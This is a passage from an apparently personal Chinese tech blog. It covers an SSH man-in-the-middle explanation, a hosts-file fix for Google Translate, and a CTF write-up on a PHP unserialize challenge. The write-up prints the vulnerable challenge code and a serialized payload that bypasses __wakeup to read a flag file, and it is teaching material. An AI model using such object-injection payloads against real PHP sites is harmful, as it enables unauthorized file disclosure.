<p>如果攻击者插在用户与远程主机之间（比如在公共的wifi区域），用伪造的公钥，获取用户的加密登录密码，再用自己的私钥解密成明文，用这个密码登录远程主机，那么SSH的安全机制就不存在了。</p>
<p>如图：</p>
<p> <img src="https://pic2.zhimg.com/80/v2-46e7c27669cd6de13c1373e714ca407d_1440w.webp" alt="img"></p>
<h2 id="ssh针对中间人攻击的解决方法："><a href="#ssh针对中间人攻击的解决方法：" class="headerlink" title="ssh针对中间人攻击的解决方法："></a>ssh针对中间人攻击的解决方法：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 私有密钥是只有server才有的，也就是即使中间有人截获了步骤3中client发送的带有password信息的包，也没有办法破解得知user123的密码。</span><br><span class="line">  </span><br><span class="line"> * 但是有可能有攻击者可以截获步骤1 client发送的请求包，从而伪装成 server发送自己的PubKey_attacker，然后 client 再向其发送自己用PubKey_attacker加密的password，就会被攻击者用PriKey_attacker 解密，从而得到password明文密码。所以一般要求用户在收到PubKey 时自行对比验证发送该公有密钥的主机是已知的安全主机。这就是为什么我们会看到     Are you sure you want to continue connecting (yes/no)?。 信任的主机一般都保存在$HOME/.ssh/known_hosts文件中。</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/03/19/ssh%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%BF%E7%94%A8/" data-id="clff73fkr0000wsv4hq7p31ws" data-title="ssh原理及使用" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-复活Google翻译" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/" class="article-date">
  <time class="dt-published" datetime="2022-11-21T09:59:52.000Z" itemprop="datePublished">2022-11-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/">复活Google翻译</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>近期发现我<strong>Google浏览器</strong>的Google翻译无法使用了（经常的毛病），于是就试着找下Google翻译一些可用IP，然后将这些IP添加到hosts文件中，Google翻译就完美复活了。妈妈再也不用担心Google翻译I无法使用啦（这么多IP，Google翻译稳定性将会大大滴提高🥳🥳）♪(´▽｀)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注：什么是hosts文件</span><br><span class="line"></span><br><span class="line">hosts是一个没有扩展名的系统文件，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址并打开对应网页；如果没有找到则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</span><br></pre></td></tr></table></figure>



<p>下面看下具体过程叭（<strong>复活的是Google浏览器中的Google翻译，没有测试edge</strong>）</p>
<p>首先找到并用记事本打开Windows下hosts文件，位置是“<strong>C:\Windows\System32\drivers\etc</strong>”。</p>
<p><img src="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/image-20221121180954742.png"></p>
<p>然后将下面的IP 域名一起复制下，并在hosts文件中找个位置粘贴下来</p>
<p><img src="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/image-20221121181312643.png"></p>
<p>最后按下<strong>crl键加s键</strong>保存下来就好了φ(*￣0￣)</p>
<p>注：有的小伙伴可能遇到hosts文件打不开等情况，建议去百度搜索下电脑给出的报错信息，然后按指示操作就好啦~</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">142.250.4.90 translate.googleapis.com</span><br><span class="line">172.253.114.90 translate.googleapis.com</span><br><span class="line">172.217.203.90 translate.googleapis.com</span><br><span class="line">172.253.112.90 translate.googleapis.com</span><br><span class="line">142.250.9.90 translate.googleapis.com</span><br><span class="line">172.253.116.90 translate.googleapis.com</span><br><span class="line">142.250.97.90 translate.googleapis.com</span><br><span class="line">142.250.30.90 translate.googleapis.com</span><br><span class="line">142.250.111.90 translate.googleapis.com</span><br><span class="line">172.217.215.90 translate.googleapis.com</span><br><span class="line">142.250.11.90 translate.googleapis.com</span><br><span class="line">142.251.9.90 translate.googleapis.com</span><br><span class="line">108.177.122.90 translate.googleapis.com</span><br><span class="line">142.250.96.90 translate.googleapis.com</span><br><span class="line">142.250.100.90 translate.googleapis.com</span><br><span class="line">142.250.110.90 translate.googleapis.com</span><br><span class="line">172.217.214.90 translate.googleapis.com</span><br><span class="line">172.217.222.90 translate.googleapis.com</span><br><span class="line">142.250.31.90 translate.googleapis.com</span><br><span class="line">142.250.126.90 translate.googleapis.com</span><br><span class="line">142.250.10.90 translate.googleapis.com</span><br><span class="line">172.217.195.90 translate.googleapis.com</span><br><span class="line">172.253.115.90 translate.googleapis.com</span><br><span class="line">142.251.5.90 translate.googleapis.com</span><br><span class="line">142.250.136.90 translate.googleapis.com</span><br><span class="line">142.250.12.90 translate.googleapis.com</span><br><span class="line">142.250.101.90 translate.googleapis.com</span><br><span class="line">172.217.192.90 translate.googleapis.com</span><br><span class="line">142.250.0.90 translate.googleapis.com</span><br><span class="line">142.250.107.90 translate.googleapis.com</span><br><span class="line">172.217.204.90 translate.googleapis.com</span><br><span class="line">142.250.28.90 translate.googleapis.com</span><br><span class="line">142.250.125.90 translate.googleapis.com</span><br><span class="line">172.253.124.90 translate.googleapis.com</span><br><span class="line">142.250.8.90 translate.googleapis.com</span><br><span class="line">142.250.128.90 translate.googleapis.com</span><br><span class="line">142.250.112.90 translate.googleapis.com</span><br><span class="line">142.250.27.90 translate.googleapis.com</span><br><span class="line">142.250.105.90 translate.googleapis.com</span><br><span class="line">172.253.126.90 translate.googleapis.com</span><br><span class="line">172.253.123.90 translate.googleapis.com</span><br><span class="line">172.253.122.90 translate.googleapis.com</span><br><span class="line">172.253.62.90 translate.googleapis.com</span><br><span class="line">142.250.98.90 translate.googleapis.com</span><br><span class="line">142.250.185.238 translate.googleapis.com</span><br><span class="line">142.251.116.101 translate.googleapis.com</span><br><span class="line">216.58.214.14 translate.googleapis.com</span><br><span class="line">142.250.189.206 translate.googleapis.com</span><br><span class="line">216.58.209.174 translate.googleapis.com</span><br><span class="line">142.250.203.142 translate.googleapis.com</span><br><span class="line">142.250.218.14 translate.googleapis.com</span><br><span class="line">142.251.10.138 translate.googleapis.com</span><br><span class="line">142.251.40.174 translate.googleapis.com</span><br><span class="line">142.250.185.174 translate.googleapis.com</span><br><span class="line">172.217.16.46 translate.googleapis.com</span><br><span class="line">172.217.0.46 translate.googleapis.com</span><br><span class="line">172.217.31.142 translate.googleapis.com</span><br><span class="line">216.58.220.142 translate.googleapis.com</span><br><span class="line">172.217.13.142 translate.googleapis.com</span><br><span class="line">142.250.110.90 translate.googleapis.com</span><br><span class="line">172.217.203.90 translate.googleapis.com</span><br><span class="line">172.253.112.90 translate.googleapis.com</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/" data-id="claqmby5c0000zgv47q2g7970" data-title="复活Google翻译" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-NSSCTF-SWPUCTF-ez-ez-unserialize" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/" class="article-date">
  <time class="dt-published" datetime="2022-10-20T10:00:30.000Z" itemprop="datePublished">2022-10-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/">由NSSCTF-SWPUCTF-ez_ez_unserialize，引发对反序列具体详细过程以及对__construct，__destruct函数执行情况深度分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>前置知识：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1，php中__FILE__是什么意思，</span><br><span class="line">php中__FILE__是一个魔术常量，它会返回当前执行PHP脚本的完整路径和文件名。自PHP 4.0.2版本起，它总是包含一个绝对路径。</span><br><span class="line"></span><br><span class="line">2,__wakeup()说明，</span><br><span class="line">unserialize()会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup() 方法</span><br><span class="line"></span><br><span class="line">3，__wakeup()魔术方法绕过，</span><br><span class="line">php版本为PHP5&lt;5.6.25，PHP7 &lt; 7.0.10时，只要序列化的中的成员数大于实际成员数，即可绕过该魔法函数，比如一个ctf的类序列化后是   </span><br><span class="line">O:3:&quot;ctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">把成员数&quot;1&quot;，改为&quot;2&quot;即可绕过，更改之后为</span><br><span class="line">O:3:&quot;ctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>进入靶场，发现是一个反序列化题目，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$x</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$x</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x !== <span class="keyword">__FILE__</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;x = <span class="keyword">__FILE__</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">        <span class="comment">//flag is in fllllllag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先说下我当时的想法，就是一看到__wakeup()，八成是要绕过它的，然后危险函数是highlight_file()，只需要把里面的变量换为flag的绝对路径，然后将序列化后的字符中路径修改为靶机flag文件的绝对路径，接着再修改成员数（必须大于当前真实的成员数目），提交参数就可以了。</p>
<p>编写poc，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">X</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>运行结果为，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:37:&quot;D:\桌面\工具\php\teacher.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>百度搜下linux的www文件目录一般是什么，</p>
<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/2.png"></p>
<p>那么把目录修改下，最终的payload为，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:27:&quot;/var/www/html/fllllllag.php&quot;;&#125;</span><br><span class="line">//注意目录改变后，需要将目录的长度修改为当前实际长度27（原来是37）</span><br><span class="line">//因为要绕过__wakeup()，需要将成员数1修改为2（任何大于1的都可以）</span><br></pre></td></tr></table></figure>

<p>提交成功，flag浮现，</p>
<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/3.png"></p>
<hr>
<hr>
<p>​              <em><strong>写一个题目的目的不仅仅是找到正确flag得分，更重要的是从这个题目中学到了些什么知识</strong></em></p>
<p>这个题目我只是依靠经验做出来了，但是如果让我具体分析</p>
<p>1，为什么要绕过<code>__wakeup()</code>，不绕过为什么不行？</p>
<p>2，为什么提交payload后不是显示的是<code>x = __FILE__;</code>的源码？触发__construct()函数不是会将$x赋值为当前文件件绝对路径吗？我说不出来……</p>
<hr>
<hr>
<p>所以在提交完正确的flag后，我也是想到了刚才说的两个问题，于是乎再研究了一下，现在回答下这两个问题。</p>
<p>先了解一下反序列化具体过程，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>() 对单一的已序列化的变量进行操作，将其转换回 php 的值。在解序列化一个对象前，这个对象的类必须在解序列化之前定义。 </span><br><span class="line">简单来理解起来就算将序列化过存储到文件中的数据，恢复到程序代码的变量表示形式的过程，恢复到变量序列化之前的结果。</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">file_get_contents</span>(‘./目标文本文件<span class="string">&#x27;); //取得文本文件的内容（之前序列化过的字符串）</span></span><br><span class="line"><span class="string">$变量 = unserialize($s); //将该文本内容，反序列化到指定的变量中</span></span><br></pre></td></tr></table></figure>

<p>通过一个例子来了解反序列化：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;user &#x27;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27; is &#x27;</span>.<span class="variable language_">$this</span>-&gt;age.<span class="string">&#x27; years old. &lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重建对象</span></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;user&quot;:2:&#123;s:3:&quot;age&quot;;i:10;s:4:&quot;name&quot;;s:4:&quot;tome&quot;;&#125;&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">printdata</span>();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过源码知道，虽然没有创建类user的对象，但是反序列化之后，可以直接调用$user中的printdata()方法。那么问题来了，unserialize()函数返回的是个什么东东，为什么可以当对象使用？</p>
<p>在本地测试一下，</p>
<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/6.png"></p>
<p>发现unserialize()函数返回值是类user的一个实例对象，其中对象里变量$age，$name的值是序列化字符串里对应的，10，tome。</p>
<p><strong>简单说，不管类中变量值是什么，构造的序列化字符串里变量的值是什么，反序列化后创建的该类对象里的变量值就是什么。</strong></p>
<p>上述代码运行结果如下，</p>
<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/5.png"></p>
<p>验证了上述猜测。</p>
<p>我还有个疑问，就是<code>__construct()，__destruct()</code>这两个函数什么情况下被触发？以前都是看的比较专业的语言说明的，也没看太懂。</p>
<p>通过下面例子可以更明白两个函数被触发的情况，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;000\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;111\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;222\n&quot;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$class</span>);</span><br></pre></td></tr></table></figure>

<p>输出，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__construct()!!!000</span><br><span class="line">111</span><br><span class="line">222</span><br><span class="line">__destruct()!!!__destruct()!!!</span><br></pre></td></tr></table></figure>

<p>去掉unset()函数，再试下没有该函数，会不会触发<code>__destruct()</code>函数？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;000\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;111\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;222\n&quot;</span>;</span><br><span class="line"><span class="comment">//unset($class);</span></span><br></pre></td></tr></table></figure>

<p>输出结果，还是一样的，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__construct()!!!000</span><br><span class="line">111</span><br><span class="line">222</span><br><span class="line">__destruct()!!!__destruct()!!!</span><br></pre></td></tr></table></figure>



<p>（1）<strong>说明<code>__construct()</code>会在创建对象的时候(<code>$class = new TestClass();</code>)被触发，但是反序列化时<code>$b = unserialize($a);</code>，不会被触发。</strong></p>
<p>为什么反序列化返回了一个对象，但是不会触发<code>__construct()</code>呢？下面是我的一些理解，有不正确的地方请各位大佬批评指正，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">虽然有对象被创建，但是因为unserialize函数不一定返回的是对象，可返回 integer、float、string、array 或 object。</span><br><span class="line">如果反序列化返回的不是一个对象，那么__construct()就不会被触发， 而integer、float、string、array这些数据类型应该是一样的。</span><br><span class="line">所以反序列化返回的是一个对象时，也不会触发__construct()。</span><br><span class="line">因此可以理解为什么反序列化对象字符为对象的时候，虽然有对象被创建，甚至可以调用返回对象中的函数，但是并不会触发__construct()函数</span><br></pre></td></tr></table></figure>



<p>（2）<strong>说明<code>__destruct()</code>会在代码执行完成后被触发一次，因为在php中，程序在运行结束后，会自动的销毁对象！这时会触发destruct()函数。反序列化完成时会触发一次(我理解的是销毁对象)，所以才输出两个<code>__destruct()!!!</code>。</strong></p>
<p>反序列化完成时会触发<code>__destruct()</code>函数一次(我理解的是销毁对象)，这个怎么理解呢，直接上代码说明，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="comment">//$b = unserialize($a);</span></span><br><span class="line"><span class="comment">//没有反序列化的情况下，输出__destruct()!!!</span></span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//有反序列的情况下，输出__destruct()!!!__destruct()!!!</span></span><br></pre></td></tr></table></figure>



<hr>
<hr>
<p>最后总的来梳理一下题目反序列化时的过程，</p>
